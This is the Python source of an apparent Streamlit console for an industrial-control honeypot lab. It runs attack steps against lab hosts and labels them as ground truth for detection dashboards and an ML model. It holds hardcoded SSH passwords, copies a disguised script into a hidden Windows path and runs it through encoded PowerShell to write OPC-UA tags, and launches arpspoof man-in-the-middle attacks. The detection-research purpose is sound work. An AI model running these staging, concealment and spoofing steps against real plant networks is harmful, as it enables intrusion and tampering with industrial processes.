from __future__ import annotations

import os
import signal
import socket
import subprocess
import json
import re
import base64
import shlex
import time
import secrets
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from dataclasses import dataclass
from typing import Dict, List, Tuple

import paramiko
import streamlit as st

# Demo environment (hardcoded for demo simplicity)
EWS_HOST = "192.168.1.5"
EWS_USER = "john"
EWS_PASSWORD = "Cisco"
SSH_PORT = 22
SSH_TIMEOUT_SECONDS = 15

MONITOR_HOST = "192.168.1.9"
SMB_TARGET = "192.168.1.7"
HISTORIAN_HOST = "192.168.1.10"

GRAFANA_URL = f"http://{MONITOR_HOST}:3000/d/adx2v2p/soc-honeypot-detection-dashboard?orgId=1&from=now-2h&to=now&timezone=browser&refresh=10s"
WAZUH_URL = f"https://{MONITOR_HOST}"
HISTORIAN_URL = f"http://{HISTORIAN_HOST}:5000"
LOKI_URL = f"http://{MONITOR_HOST}:3100"
LEVEL3_SUBNET = "192.168.1.0/24"
LEVEL35_JUMP_HOST = "192.168.1.20"
OPCUA_ENDPOINT = "opc.tcp://192.168.1.11:4840"
ARPSPOOF_PATH = r"C:\Users\john\Downloads\arpspoof.exe"
ARPSPOOF_IFACE = ""
ARPSPOOF_TARGET_1 = HISTORIAN_HOST
ARPSPOOF_TARGET_2 = "192.168.1.11"

MANIPULATE_TEMPLATE_PATH = Path(__file__).resolve().parent / "payloads" / "telemetry_sync_cache.py"
MANIPULATE_SCRIPT = r"C:\Users\john\AppData\Local\Microsoft\Diagnosis\Downloads\telemetry_sync_cache.py"
REPO_ROOT = Path(__file__).resolve().parents[1]
STREAMLIT_SCENARIO_ROOT = REPO_ROOT / "artifacts" / "scenario-runs"
ML_MODEL_PATH = REPO_ROOT / "ml" / "runs" / "latest" / "model.pt"
SYNTHETIC_MARKERS_ENABLED = os.environ.get("STREAMLIT_SYNTHETIC_MARKERS", "0") == "1"
SYNTHETIC_ZEEK_FEED_PATH = Path("/home/ceo/zeek_feed.synthetic.log")
SYNTHETIC_WAZUH_ALERTS_PATH = Path("/home/ceo/wazuh_alerts.synthetic.json")

ANSI_RE = re.compile(r"\x1B(?:\[[0-?]*[ -/]*[@-~]|\].*?(?:\x07|\x1B\\)|[@-Z\\-_])")
CLIXML_RE = re.compile(r"#<\s*CLIXML[\s\S]*$", re.MULTILINE)


def append_json_line(path: Path, payload: Dict) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "a", encoding="utf-8") as fh:
        fh.write(json.dumps(payload, ensure_ascii=True, separators=(",", ":")) + "\n")


def write_synthetic_zeek_marker(payload: Dict) -> Tuple[bool, str]:
    if not SYNTHETIC_MARKERS_ENABLED:
        return False, ""

    append_json_line(SYNTHETIC_ZEEK_FEED_PATH, payload)
    return True, str(SYNTHETIC_ZEEK_FEED_PATH)


def write_synthetic_wazuh_alert(payload: Dict) -> Tuple[bool, str]:
    if not SYNTHETIC_MARKERS_ENABLED:
        return False, ""

    append_json_line(SYNTHETIC_WAZUH_ALERTS_PATH, payload)
    return True, str(SYNTHETIC_WAZUH_ALERTS_PATH)


def load_manipulation_payload() -> str:
    return MANIPULATE_TEMPLATE_PATH.read_text(encoding="utf-8")


def build_manipulation_display(opcua_endpoint: str, remote_path: str) -> str:
    return (
        f"copy telemetry_sync_cache.py {remote_path}\n"
        f"$dest = '{remote_path}'\n"
        "attrib +h $dest\n"
        f"py -3.11 $dest --endpoint {opcua_endpoint} --cycles 18 --pause 1.0"
    )


def build_manipulation_exec(opcua_endpoint: str, remote_path: str) -> str:
    dest = remote_path.replace("'", "''")
    endpoint = opcua_endpoint.replace("'", "''")
    stage_ps = (
        f"$dest='{dest}';"
        "if (-not (Test-Path $dest)) { Write-Output 'staged payload missing'; exit 1 };"
        "attrib +h $dest > $null 2>&1;"
        "if (-not (Get-Command py -ErrorAction SilentlyContinue)) { Write-Output 'py launcher not found'; exit 1 };"
        f"& py -3.11 $dest --endpoint '{endpoint}' --cycles 18 --pause 1.0"
    )
    return powershell_encoded_command(stage_ps)


def windows_path_to_scp(path: str) -> str:
    normalized = path.replace("\\", "/")
    if re.match(r"^[A-Za-z]:/", normalized):
        return f"/{normalized}"
    return normalized


def stage_remote_manipulation_payload(remote_path: str) -> Tuple[int, str]:
    ok, msg = ssh_credentials_ready()
    if not ok:
        return -1, f"[INPUT ERROR] {msg}"

    remote_path = sanitize_windows_token(remote_path) or MANIPULATE_SCRIPT
    remote_dir = remote_path.rsplit("\\", 1)[0]
    path_escaped = remote_path.replace("'", "''")
    dir_escaped = remote_dir.replace("'", "''")
    prep_ps = (
        "$existing = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | "
        "Where-Object { $_.CommandLine -like '*telemetry_sync_cache.py*' };"
        "foreach ($proc in $existing) {"
        "  try { Stop-Process -Id $proc.ProcessId -Force -ErrorAction Stop } catch {}"
        "};"
        f"$dir='{dir_escaped}';"
        "New-Item -ItemType Directory -Force -Path $dir | Out-Null;"
        f"$dest='{path_escaped}';"
        "if (Test-Path $dest) {"
        "  attrib -h -r $dest > $null 2>&1;"
        "  Remove-Item -LiteralPath $dest -Force -ErrorAction SilentlyContinue;"
        "}"
    )
    prep_rc, prep_out = run_remote_capture(powershell_encoded_command(prep_ps), 45)
    if prep_rc != 0:
        return prep_rc, prep_out

    scp_target = f"{st.session_state.ews_user}@{st.session_state.ews_host}:{windows_path_to_scp(remote_path)}"
    try:
        proc = subprocess.run(
            [
                "sshpass",
                "-p",
                st.session_state.ews_password,
                "scp",
                "-q",
                "-o",
                "StrictHostKeyChecking=no",
                "-o",
                "UserKnownHostsFile=/dev/null",
                str(MANIPULATE_TEMPLATE_PATH),
                scp_target,
            ],
            capture_output=True,
            text=True,
            timeout=45,
        )
    except subprocess.TimeoutExpired:
        return -1, "[STAGE ERROR] payload upload timed out after 45s"

    if proc.returncode != 0:
        merged = ((proc.stdout or "") + ("\n" + proc.stderr if proc.stderr else "")).strip()
        return proc.returncode, f"[STAGE ERROR] payload upload failed.\n{merged}".strip()

    return 0, f"staged telemetry_sync_cache.py to {remote_path}"


def build_opc_probe_display(opc_host: str, opc_port: int) -> str:
    return (
        "powershell -NoProfile -Command "
        f"\"$client = [System.Net.Sockets.TcpClient]::new(); "
        f"try {{ $iar = $client.BeginConnect('{opc_host}', {opc_port}, $null, $null); "
        "if (-not $iar.AsyncWaitHandle.WaitOne(4000, $false)) { throw 'timeout' }; "
        "$client.EndConnect($iar); Write-Output 'TcpTestSucceeded : True'; exit 0 } "
        "catch { Write-Output 'TcpTestSucceeded : False'; exit 1 } "
        "finally { $client.Close() }\""
    )


def build_opc_probe_exec(opc_host: str, opc_port: int) -> str:
    script = (
        f"$targetHost = '{opc_host}';"
        f"$port = {opc_port};"
        "$client = [System.Net.Sockets.TcpClient]::new();"
        "try {"
        "  $iar = $client.BeginConnect($targetHost, $port, $null, $null);"
        "  if (-not $iar.AsyncWaitHandle.WaitOne(4000, $false)) { throw 'timeout' };"
        "  $client.EndConnect($iar);"
        "  Write-Output ('TcpTestSucceeded : True (' + $targetHost + ':' + $port + ')');"
        "  exit 0"
        "} catch {"
        "  Write-Output ('TcpTestSucceeded : False (' + $targetHost + ':' + $port + ')');"
        "  exit 1"
        "} finally {"
        "  $client.Close()"
        "}"
    )
    return powershell_encoded_command(script)


def build_arpspoof_display(exe: str, iface: str, target_1: str, target_2: str) -> str:
    if iface.strip():
        return f'cmd /c "{exe} -i \\"{iface}\\" {target_1} {target_2}"'
    return f'cmd /c "{exe} {target_1} {target_2}"'


def build_arpspoof_managed_launch(exe: str, iface: str, target_1: str, target_2: str, remote_log: str) -> str:
    iface_part = f' -i \\"{iface}\\"' if iface.strip() else ""
    return f'cmd /c "{exe}{iface_part} {target_1} {target_2} > {remote_log} 2>&1"'


@dataclass
class AttackStep:
    idx: int
    title: str
    mitre: str
    description: str
    ssh_display: str
    ews_display: str
    command_exec: str
    exec_mode: str = "ews"
    timeout: int = 240


@dataclass
class AttackVariant:
    key: str
    title: str
    mitre: str
    description: str
    command_display: str
    command_exec: str
    exec_mode: str = "local"
    timeout: int = 180
    expected_rules: Tuple[str, ...] = ()


def streamlit_variant_metadata(variant_key: str) -> Dict[str, str]:
    mapping = {
        "failed_ssh_then_success": {
            "scenario_step": "variant_failed_ssh_then_success",
            "attack_label": "credential_access",
            "attack_stage": "credential_access",
            "asset_class": "ews",
            "mitre_technique": "T0812",
            "source_asset": "monitoring_laptop",
            "target_asset": "ews",
            "event_kind": "ssh_session",
        },
        "powershell_recon": {
            "scenario_step": "variant_powershell_recon",
            "attack_label": "recon",
            "attack_stage": "host_command",
            "asset_class": "ews",
            "mitre_technique": "T0842",
            "source_asset": "ews",
            "target_asset": "ews",
            "event_kind": "process_launch",
        },
        "smb_deep_collection": {
            "scenario_step": "variant_smb_deep_collection",
            "attack_label": "collection",
            "attack_stage": "smb_access",
            "asset_class": "smb",
            "mitre_technique": "T0811",
            "source_asset": "monitoring_laptop",
            "target_asset": "smb",
            "event_kind": "smb_browse",
        },
        "historian_heavy_collection": {
            "scenario_step": "variant_historian_heavy_collection",
            "attack_label": "collection",
            "attack_stage": "historian_web",
            "asset_class": "historian",
            "mitre_technique": "T0802",
            "source_asset": "ews",
            "target_asset": "historian",
            "event_kind": "http_request",
        },
        "critical_opcua_write": {
            "scenario_step": "variant_critical_opcua_write",
            "attack_label": "impact",
            "attack_stage": "opcua_write",
            "asset_class": "opcua",
            "mitre_technique": "T0831",
            "source_asset": "monitoring_laptop",
            "target_asset": "opcua",
            "event_kind": "payload_send",
        },
    }
    return mapping.get(
        variant_key,
        {
            "scenario_step": f"variant_{variant_key}",
            "attack_label": "attack",
            "attack_stage": "host_command",
            "asset_class": "ews",
            "mitre_technique": "T0000",
            "source_asset": "unknown",
            "target_asset": "unknown",
            "event_kind": "process_launch",
        },
    )


def init_state() -> None:
    if "buffers" not in st.session_state:
        st.session_state.buffers = {}
    if "running" not in st.session_state:
        st.session_state.running = {}
    if "last_exit" not in st.session_state:
        st.session_state.last_exit = {}
    if "mitm_running" not in st.session_state:
        st.session_state.mitm_running = False
    if "mitm_mode" not in st.session_state:
        st.session_state.mitm_mode = "Local attacker (Linux arpspoof)"
    if "mitm_iface_local" not in st.session_state:
        iface = ""
        try:
            proc = subprocess.run(
                ["bash", "-lc", "ip -o link show | awk -F': ' '{print $2}' | grep -E '^(wl|en|eth)' | head -n 1"],
                capture_output=True,
                text=True,
                timeout=3,
            )
            iface = (proc.stdout or "").strip()
        except Exception:
            iface = ""
        st.session_state.mitm_iface_local = iface or "wlo1"
    if "mitm_local_pids" not in st.session_state:
        st.session_state.mitm_local_pids = []
    if "mitm_local_sudo_password" not in st.session_state:
        st.session_state.mitm_local_sudo_password = ""
    if "mitm_remote_ssh_pid" not in st.session_state:
        st.session_state.mitm_remote_ssh_pid = 0
    if "mitm_remote_log" not in st.session_state:
        st.session_state.mitm_remote_log = ""
    if "evidence_out" not in st.session_state:
        st.session_state.evidence_out = {}
    if "arp_before" not in st.session_state:
        st.session_state.arp_before = ""
    if "arp_after" not in st.session_state:
        st.session_state.arp_after = ""
    if "diag_out" not in st.session_state:
        st.session_state.diag_out = ""
    if "ews_host" not in st.session_state:
        st.session_state.ews_host = EWS_HOST
    if "ews_user" not in st.session_state:
        st.session_state.ews_user = EWS_USER
    if "ews_password" not in st.session_state:
        st.session_state.ews_password = EWS_PASSWORD
    if "smb_user" not in st.session_state:
        st.session_state.smb_user = ""
    if "smb_password" not in st.session_state:
        st.session_state.smb_password = ""
    if "historian_ssh_user" not in st.session_state:
        st.session_state.historian_ssh_user = "mm8"
    if "historian_ssh_password" not in st.session_state:
        st.session_state.historian_ssh_password = "Cisco"
    if "level35_jump_host" not in st.session_state:
        st.session_state.level35_jump_host = LEVEL35_JUMP_HOST
    if "arpspoof_path" not in st.session_state:
        st.session_state.arpspoof_path = ARPSPOOF_PATH
    if "arpspoof_iface" not in st.session_state:
        st.session_state.arpspoof_iface = ARPSPOOF_IFACE
    if "arpspoof_target_1" not in st.session_state:
        st.session_state.arpspoof_target_1 = ARPSPOOF_TARGET_1
    if "arpspoof_target_2" not in st.session_state:
        st.session_state.arpspoof_target_2 = ARPSPOOF_TARGET_2
    if "manipulate_script" not in st.session_state:
        st.session_state.manipulate_script = MANIPULATE_SCRIPT
    if "demo_session_id" not in st.session_state:
        st.session_state.demo_session_id = new_demo_session_id()
    if "inject_demo_markers" not in st.session_state:
        st.session_state.inject_demo_markers = False
    if "custom_exec_mode" not in st.session_state:
        st.session_state.custom_exec_mode = "ews"
    if "custom_command_input" not in st.session_state:
        st.session_state.custom_command_input = "hostname && whoami"
    if "custom_timeout" not in st.session_state:
        st.session_state.custom_timeout = 90
    if "custom_use_pty" not in st.session_state:
        st.session_state.custom_use_pty = False


def new_demo_session_id() -> str:
    return f"DEMO-{time.strftime('%Y%m%d-%H%M%S', time.gmtime())}-{secrets.token_hex(3)}"


def get_demo_session_id() -> str:
    sid = (st.session_state.get("demo_session_id") or "").strip()
    if not sid:
        sid = new_demo_session_id()
        st.session_state.demo_session_id = sid
    return sid


def streamlit_manifest_path() -> Path:
    session_id = get_demo_session_id()
    out_dir = STREAMLIT_SCENARIO_ROOT / session_id
    out_dir.mkdir(parents=True, exist_ok=True)
    return out_dir / "ground_truth.jsonl"


def manifest_path_for_session(session_id: str) -> Path:
    return STREAMLIT_SCENARIO_ROOT / session_id / "ground_truth.jsonl"


def manifest_window_for_session(session_id: str) -> Tuple[str, str] | None:
    if not session_id or session_id == ".*":
        return None

    manifest_path = manifest_path_for_session(session_id)
    if not manifest_path.exists():
        return None

    start_ts: float | None = None
    end_ts: float | None = None
    for raw_line in manifest_path.read_text(encoding="utf-8").splitlines():
        line = raw_line.strip()
        if not line:
            continue
        try:
            row = json.loads(line)
        except json.JSONDecodeError:
            continue
        row_start = row.get("start_ts_epoch")
        row_end = row.get("end_ts_epoch")
        if isinstance(row_start, (int, float)):
            start_ts = row_start if start_ts is None else min(start_ts, float(row_start))
        if isinstance(row_end, (int, float)):
            end_ts = row_end if end_ts is None else max(end_ts, float(row_end))

    if start_ts is None:
        return None

    start_ms = str(max(0, int((start_ts - 120) * 1000)))
    if end_ts is None or (time.time() - float(end_ts)) <= 600:
        end_value = "now"
    else:
        end_value = str(int((float(end_ts) + 180) * 1000))
    return start_ms, end_value


def streamlit_output_path(step_name: str) -> Path:
    safe_name = re.sub(r"[^A-Za-z0-9_.-]+", "_", step_name).strip("_") or "step"
    return streamlit_manifest_path().parent / f"{int(time.time())}_{safe_name}.txt"


def streamlit_session_summary() -> str:
    return "Interactive Streamlit demo session executed from the operator console."


def synthetic_markers_requested() -> bool:
    return SYNTHETIC_MARKERS_ENABLED and bool(st.session_state.get("inject_demo_markers", False))


def grafana_dashboard_base() -> str:
    return (st.session_state.get("grafana_url", GRAFANA_URL) or GRAFANA_URL).strip() or GRAFANA_URL


def grafana_link_for_session(session_value: str | None = None, time_from: str = "now-2h") -> str:
    base = grafana_dashboard_base()
    parsed = urllib.parse.urlsplit(base)
    query = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    query = [(key, value) for key, value in query if key not in {"var-session_id", "from", "to", "refresh"}]
    session_scope = session_value if session_value is not None else get_demo_session_id()
    start_value = time_from
    end_value = "now"
    manifest_window = manifest_window_for_session(session_scope)
    if manifest_window is not None:
        start_value, end_value = manifest_window
    query.extend(
        [
            ("from", start_value),
            ("to", end_value),
            ("refresh", "10s"),
            ("var-session_id", session_scope),
        ]
    )
    return urllib.parse.urlunsplit(parsed._replace(query=urllib.parse.urlencode(query)))


def derive_streamlit_session_outcome(metadata: Dict[str, str]) -> Tuple[str, str]:
    stage = metadata.get("attack_stage", "unknown")
    mapping = {
        "benign_access": ("credential_access", "low"),
        "discovery": ("discovery_scan", "medium"),
        "credential_access": ("credential_access", "medium"),
        "host_activity": ("credential_access", "medium"),
        "host_command": ("host_recon", "high"),
        "host_scriptblock": ("host_recon", "high"),
        "smb_access": ("collection", "high"),
        "historian_web": ("collection", "high"),
        "opcua_path": ("ot_recon", "critical"),
        "opcua_write": ("ot_impact", "critical"),
        "process_anomaly": ("ot_impact", "critical"),
    }
    return mapping.get(stage, ("host_recon", "medium"))


def streamlit_custom_command_metadata(command: str, exec_mode: str) -> Dict[str, str]:
    raw = (command or "").strip()
    cmd = raw.lower()
    if "telemetry_sync_cache.py" in cmd or ("opc.tcp://" in cmd and "--cycles" in cmd):
        return {
            "scenario_step": "custom_opcua_write",
            "attack_label": "impact",
            "attack_stage": "opcua_write",
            "asset_class": "opcua",
            "mitre_technique": "T0831",
            "source_asset": "ews" if exec_mode == "ews" else "monitoring_laptop",
            "target_asset": "opcua_server",
            "event_kind": "payload_send",
        }
    if "4840" in cmd or "opcua" in cmd or "test-netconnection" in cmd:
        return {
            "scenario_step": "custom_opcua_probe",
            "attack_label": "recon",
            "attack_stage": "opcua_path",
            "asset_class": "opcua",
            "mitre_technique": "T0861",
            "source_asset": "ews" if exec_mode == "ews" else "monitoring_laptop",
            "target_asset": "opcua_server",
            "event_kind": "network_probe",
        }
    if "5000" in cmd or "/portal/history" in cmd or "/login" in cmd or "historian" in cmd:
        return {
            "scenario_step": "custom_historian_access",
            "attack_label": "collection",
            "attack_stage": "historian_web",
            "asset_class": "historian",
            "mitre_technique": "T0802",
            "source_asset": "ews" if exec_mode == "ews" else "monitoring_laptop",
            "target_asset": "historian",
            "event_kind": "http_request",
        }
    if "smbclient" in cmd or "get-smbmapping" in cmd or "\\\\" in raw or " 445" in cmd:
        return {
            "scenario_step": "custom_smb_access",
            "attack_label": "collection",
            "attack_stage": "smb_access",
            "asset_class": "smb",
            "mitre_technique": "T0811",
            "source_asset": "ews" if exec_mode == "ews" else "monitoring_laptop",
            "target_asset": "smb_server",
            "event_kind": "smb_browse",
        }
    if "arpspoof" in cmd:
        return {
            "scenario_step": "custom_arp_mitm",
            "attack_label": "impact",
            "attack_stage": "host_command",
            "asset_class": "ews" if exec_mode == "ews" else "workstation",
            "mitre_technique": "T1557",
            "source_asset": "ews" if exec_mode == "ews" else "monitoring_laptop",
            "target_asset": "historian",
            "event_kind": "process_launch",
        }
    if "nmap" in cmd or "ping " in cmd or "nc " in cmd or "netcat" in cmd:
        return {
            "scenario_step": "custom_discovery",
            "attack_label": "recon",
            "attack_stage": "discovery",
            "asset_class": "level3",
            "mitre_technique": "T0846",
            "source_asset": "monitoring_laptop" if exec_mode == "local" else "ews",
            "target_asset": "lab_network",
            "event_kind": "network_probe",
        }
    if "powershell" in cmd or "whoami" in cmd or "hostname" in cmd or "ipconfig" in cmd or "get-process" in cmd or "tasklist" in cmd:
        return {
            "scenario_step": "custom_host_command",
            "attack_label": "recon",
            "attack_stage": "host_command",
            "asset_class": "ews" if exec_mode == "ews" else "workstation",
            "mitre_technique": "T0842",
            "source_asset": "ews" if exec_mode == "ews" else "monitoring_laptop",
            "target_asset": "ews" if exec_mode == "ews" else "monitoring_laptop",
            "event_kind": "process_launch",
        }
    if exec_mode == "local":
        return {
            "scenario_step": "custom_local_command",
            "attack_label": "foothold",
            "attack_stage": "benign_access",
            "asset_class": "workstation",
            "mitre_technique": "T0866",
            "source_asset": "monitoring_laptop",
            "target_asset": "monitoring_laptop",
            "event_kind": "shell_command",
        }
    return {
        "scenario_step": "custom_ews_command",
        "attack_label": "recon",
        "attack_stage": "host_command",
        "asset_class": "ews",
        "mitre_technique": "T0842",
        "source_asset": "ews",
        "target_asset": "ews",
        "event_kind": "process_launch",
    }


def streamlit_step_metadata(step_idx: int) -> Dict[str, str]:
    if step_idx == 1:
        return {
            "scenario_step": "step_1_initial_foothold",
            "attack_label": "foothold",
            "attack_stage": "benign_access",
            "asset_class": "workstation",
            "mitre_technique": "T0866",
            "source_asset": "monitoring_laptop",
            "target_asset": "monitoring_laptop",
            "event_kind": "shell_command",
        }
    if step_idx == 2:
        return {
            "scenario_step": "step_2_service_discovery",
            "attack_label": "discovery",
            "attack_stage": "discovery",
            "asset_class": "network",
            "mitre_technique": "T0846",
            "source_asset": "monitoring_laptop",
            "target_asset": "level3_network",
            "event_kind": "network_scan",
        }
    if step_idx == 3:
        return {
            "scenario_step": "step_3_smb_credential_discovery",
            "attack_label": "collection",
            "attack_stage": "smb_access",
            "asset_class": "smb",
            "mitre_technique": "T0811",
            "source_asset": "monitoring_laptop",
            "target_asset": "smb",
            "event_kind": "smb_browse",
        }
    if step_idx == 4:
        access_method = st.session_state.get("ews_access_method", "SSH")
        return {
            "scenario_step": "step_4_ews_access",
            "attack_label": "lateral_movement",
            "attack_stage": "host_activity",
            "asset_class": "ews",
            "mitre_technique": "T0866",
            "source_asset": "monitoring_laptop",
            "target_asset": "ews",
            "event_kind": "rdp_session" if access_method == "RDP" else "ssh_session",
        }
    if step_idx == 5:
        return {
            "scenario_step": "step_5_historian_access",
            "attack_label": "collection",
            "attack_stage": "historian_web",
            "asset_class": "historian",
            "mitre_technique": "T0802",
            "source_asset": "ews",
            "target_asset": "historian",
            "event_kind": "http_request",
        }
    if step_idx == 6:
        return {
            "scenario_step": "step_6_opcua_probe",
            "attack_label": "recon",
            "attack_stage": "opcua_path",
            "asset_class": "opcua",
            "mitre_technique": "T0861",
            "source_asset": "ews",
            "target_asset": "opcua",
            "event_kind": "tcp_probe",
        }
    if step_idx == 7:
        return {
            "scenario_step": "step_7_arp_mitm",
            "attack_label": "reconnaissance",
            "attack_stage": "host_command",
            "asset_class": "ews",
            "mitre_technique": "T0830",
            "source_asset": "ews",
            "target_asset": "historian_opcua",
            "event_kind": "mitm_command",
        }
    if step_idx == 8:
        return {
            "scenario_step": "step_8_tag_manipulation",
            "attack_label": "impact",
            "attack_stage": "opcua_write",
            "asset_class": "opcua",
            "mitre_technique": "T0831",
            "source_asset": "ews",
            "target_asset": "opcua",
            "event_kind": "execution",
        }
    return {
        "scenario_step": f"step_{step_idx}",
        "attack_label": "attack",
        "attack_stage": "host_command",
        "asset_class": "ews",
        "mitre_technique": "T0000",
        "source_asset": "unknown",
        "target_asset": "unknown",
        "event_kind": "process_launch",
    }


def append_streamlit_session_record(
    *,
    metadata: Dict[str, str],
    command: str,
    output: str,
    exit_code: int,
    start_ts: float,
    end_ts: float,
    output_file: Path | None = None,
    session_intent: str | None = None,
    session_danger_label: str | None = None,
) -> None:
    manifest = streamlit_manifest_path()
    output_path = output_file or streamlit_output_path(metadata.get("scenario_step", "step"))
    derived_intent, derived_danger = derive_streamlit_session_outcome(metadata)
    output_path.write_text(output, encoding="utf-8")
    record = {
        "scenario_id": get_demo_session_id(),
        "session_id": get_demo_session_id(),
        "scenario_family": "streamlit_manual_session",
        "ground_truth_label": "attack",
        "dataset_split": "ml_live_labeled",
        "telemetry_origin": "live_sensor",
        "session_intent": session_intent or derived_intent,
        "session_danger_label": session_danger_label or derived_danger,
        "session_summary": streamlit_session_summary(),
        "start_ts_epoch": round(start_ts, 6),
        "end_ts_epoch": round(end_ts, 6),
        "exit_code": int(exit_code),
        "command": command,
        "output_file": str(output_path),
        **metadata,
    }
    with manifest.open("a", encoding="utf-8") as fh:
        fh.write(json.dumps(record, ensure_ascii=True) + "\n")


def publish_current_streamlit_session_to_ml() -> None:
    manifest = streamlit_manifest_path()
    if not manifest.exists() or not ML_MODEL_PATH.exists():
        return
    try:
        session_file_arg = str(manifest.relative_to(REPO_ROOT))
    except ValueError:
        session_file_arg = os.path.relpath(str(manifest), str(REPO_ROOT))
    try:
        model_path_arg = str(ML_MODEL_PATH.relative_to(REPO_ROOT))
    except ValueError:
        model_path_arg = os.path.relpath(str(ML_MODEL_PATH), str(REPO_ROOT))
    if os.environ.get("STREAMLIT_SYNC_ML_PUBLISH", "0") != "1":
        log_path = REPO_ROOT / "artifacts" / "ml_live_publish.log"
        log_path.parent.mkdir(parents=True, exist_ok=True)
        quoted_model = shlex.quote(model_path_arg)
        quoted_session = shlex.quote(session_file_arg)
        background_cmd = (
            "flock -n /tmp/honeypot_ml_live_publish.lock bash -lc "
            + shlex.quote(
                "docker compose -f compose/docker-compose.ml.yml up -d lstm-session-runtime "
                "&& docker compose -f compose/docker-compose.ml.yml exec -T lstm-session-runtime "
                f"python -m ml.lstm_session.publish_live_session --model-path {quoted_model} "
                f"--session-file {quoted_session} --output-dir monitoring/ml "
                "|| docker compose -f compose/docker-compose.ml.yml run --rm --entrypoint python lstm-session-model "
                f"-m ml.lstm_session.publish_live_session --model-path {quoted_model} "
                f"--session-file {quoted_session} --output-dir monitoring/ml"
            )
        )
        try:
            with log_path.open("ab") as log_fh:
                subprocess.Popen(
                    ["bash", "-lc", background_cmd],
                    cwd=str(REPO_ROOT),
                    stdout=log_fh,
                    stderr=subprocess.STDOUT,
                    start_new_session=True,
                )
        except Exception:
            return
        return
    try:
        compose_cmd = ["docker", "compose", "-f", "compose/docker-compose.ml.yml"]
        subprocess.run(
            [*compose_cmd, "up", "-d", "lstm-session-runtime"],
            cwd=str(REPO_ROOT),
            capture_output=True,
            text=True,
            timeout=90,
            check=False,
        )
        exec_proc = subprocess.run(
            [
                *compose_cmd,
                "exec",
                "-T",
                "lstm-session-runtime",
                "python",
                "-m",
                "ml.lstm_session.publish_live_session",
                "--model-path",
                model_path_arg,
                "--session-file",
                session_file_arg,
                "--output-dir",
                "monitoring/ml",
            ],
            cwd=str(REPO_ROOT),
            capture_output=True,
            text=True,
            timeout=90,
            check=False,
        )
        if exec_proc.returncode == 0:
            return
        subprocess.run(
            [
                *compose_cmd,
                "run",
                "--rm",
                "--entrypoint",
                "python",
                "lstm-session-model",
                "-m",
                "ml.lstm_session.publish_live_session",
                "--model-path",
                model_path_arg,
                "--session-file",
                session_file_arg,
                "--output-dir",
                "monitoring/ml",
            ],
            cwd=str(REPO_ROOT),
            capture_output=True,
            text=True,
            timeout=90,
            check=False,
        )
    except Exception:
        return

def ssh_credentials_ready() -> Tuple[bool, str]:
    if not st.session_state.ews_host.strip():
        return False, "Set EWS host first."
    if not st.session_state.ews_user.strip():
        return False, "Set EWS user first."
    if not st.session_state.ews_password:
        return False, "Set EWS password first."
    return True, ""


def historian_ssh_credentials_ready() -> Tuple[bool, str]:
    host = st.session_state.get("historian_host", HISTORIAN_HOST).strip() or HISTORIAN_HOST
    user = st.session_state.get("historian_ssh_user", "").strip()
    password = st.session_state.get("historian_ssh_password", "")
    if not host:
        return False, "Set historian host first."
    if not user:
        return False, "Set historian SSH user first."
    if not password:
        return False, "Set historian SSH password first."
    return True, ""


def check_tcp(host: str, port: int, timeout: float = 2.0) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


def check_http(url: str, timeout: float = 3.0) -> bool:
    try:
        req = urllib.request.Request(url, method="GET")
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return 200 <= resp.status < 500
    except (urllib.error.URLError, TimeoutError, ValueError):
        return False


def check_zeek_health() -> bool:
    try:
        return subprocess.run(
            [
                "bash",
                "-lc",
                "bash /home/ceo/honeypot/scripts/check_zeek_pipeline.sh 120 >/dev/null 2>&1",
            ],
            capture_output=True,
            text=True,
            timeout=20,
        ).returncode == 0
    except Exception:
        return False


def fetch_pipeline_health() -> Dict[str, str]:
    return {
        "Zeek": "UP" if check_zeek_health() else "DOWN",
        "Wazuh": "UP" if check_tcp(MONITOR_HOST, 443) else "DOWN",
        "Loki": "UP" if check_http(f"{LOKI_URL}/ready") else "DOWN",
    }


def fetch_ews_health(ews_host: str) -> Dict[str, str]:
    return {
        "EWS SSH": "UP" if check_tcp(ews_host, 22) else "DOWN",
        "EWS RDP": "UP" if check_tcp(ews_host, 3389) else "DOWN",
    }


def fetch_rule_count(loki_base: str, rid: str, lookback: str = "15m") -> float:
    expr = f'sum(count_over_time({{job="wazuh",source="wazuh",rule_id="{rid}"}}[{lookback}])) or vector(0)'
    params = urllib.parse.urlencode({"query": expr})
    req = urllib.request.Request(f"{loki_base.rstrip('/')}/loki/api/v1/query?{params}")
    with urllib.request.urlopen(req, timeout=8) as resp:
        payload = json.loads(resp.read().decode("utf-8", errors="replace"))
    result = payload.get("data", {}).get("result", [])
    if not result:
        return 0.0
    return float(result[0]["value"][1])


def run_local(command: str, timeout: int = 25) -> str:
    try:
        proc = subprocess.run(["bash", "-lc", command], capture_output=True, text=True, timeout=timeout)
        out = (proc.stdout or "") + ("\n" + proc.stderr if proc.stderr else "")
        return out.strip() or "(no output)"
    except subprocess.TimeoutExpired:
        return f"[LOCAL ERROR] command timed out after {timeout}s"
    except Exception as exc:
        return f"[LOCAL ERROR] {exc}"


def open_ssh(host: str, user: str, password: str) -> paramiko.SSHClient:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        hostname=host,
        username=user,
        password=password,
        port=SSH_PORT,
        timeout=SSH_TIMEOUT_SECONDS,
        auth_timeout=SSH_TIMEOUT_SECONDS,
        banner_timeout=SSH_TIMEOUT_SECONDS,
        look_for_keys=False,
        allow_agent=False,
    )
    return client


def run_remote_capture_with_credentials(
    host: str,
    user: str,
    password: str,
    command: str,
    timeout: int,
    use_pty: bool = False,
) -> Tuple[int, str]:
    try:
        client = open_ssh(host, user, password)
        try:
            _, stdout, stderr = client.exec_command(command, get_pty=use_pty, timeout=timeout)
            out = stdout.read().decode(errors="replace")
            err = stderr.read().decode(errors="replace")
            rc = stdout.channel.recv_exit_status()
            merged = (out or "") + (("\n" + err) if err else "")
            cleaned = ANSI_RE.sub("", merged).replace("\r", "")
            cleaned = CLIXML_RE.sub("", cleaned).strip()
            return rc, (cleaned.strip() or "(no output)")
        finally:
            client.close()
    except paramiko.AuthenticationException:
        return -1, "[SSH ERROR] Authentication failed."
    except (paramiko.SSHException, OSError, TimeoutError) as exc:
        detail = str(exc).strip() or repr(exc)
